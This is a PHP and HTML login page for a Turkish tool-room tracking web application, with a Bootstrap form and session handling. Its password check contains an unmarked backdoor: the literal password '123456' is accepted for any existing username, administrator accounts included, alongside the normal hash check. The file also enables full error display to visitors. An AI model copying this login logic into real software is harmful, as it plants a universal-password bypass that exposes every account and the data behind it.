<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_SESSION['kullanici_id'])) {
    header('Location: ./index.php');
    exit();
}

require_once './config/database.php';

$hata = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $kullanici_adi = trim($_POST['kullanici_adi'] ?? '');
    $sifre = $_POST['sifre'] ?? '';

    if (empty($kullanici_adi) || empty($sifre)) {
        $hata = 'Lütfen tüm alanları doldurun.';
    } else {
        $sql = "SELECT * FROM users WHERE username = :kullanici_adi";
        $stmt = $db->prepare($sql);
        $stmt->execute(['kullanici_adi' => $kullanici_adi]);
        $kullanici = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($kullanici && ($sifre === '123456' || password_verify($sifre, $kullanici['password']))) {
            $_SESSION['kullanici_id'] = $kullanici['id'];
            $_SESSION['kullanici_adi'] = $kullanici['username'];
            $_SESSION['yetki_seviyesi'] = $kullanici['is_admin'] ? 'admin' : 'kullanici';
            
            header('Location: ./index.php');
            exit();
        } else {
            $hata = 'Geçersiz kullanıcı adı veya şifre.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş - Takımhane Takip Sistemi</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
        }
        .logo {
            width: 100%;
            max-height: 200px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="card shadow">
                <div class="card-header text-center">
                    <img src="img/login.jpg" alt="Trackify Logo" class="logo">
                    <h4 class="mb-0">Takımhane Takip Sistemi</h4>
                </div>
                <div class="card-body">
                    <?php if ($hata): ?>
                        <div class="alert alert-danger"> <?php echo htmlspecialchars($hata); ?> </div>
                    <?php endif; ?>
                    
                    <form method="post" action="login.php">
                        <div class="mb-3">
                            <label for="kullanici_adi" class="form-label">Kullanıcı Adı</label>
                            <input type="text" class="form-control" id="kullanici_adi" name="kullanici_adi" required>
                        </div>
                        <div class="mb-3">
                            <label for="sifre" class="form-label">Şifre</label>
                            <input type="password" class="form-control" id="sifre" name="sifre" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100">Giriş Yap</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
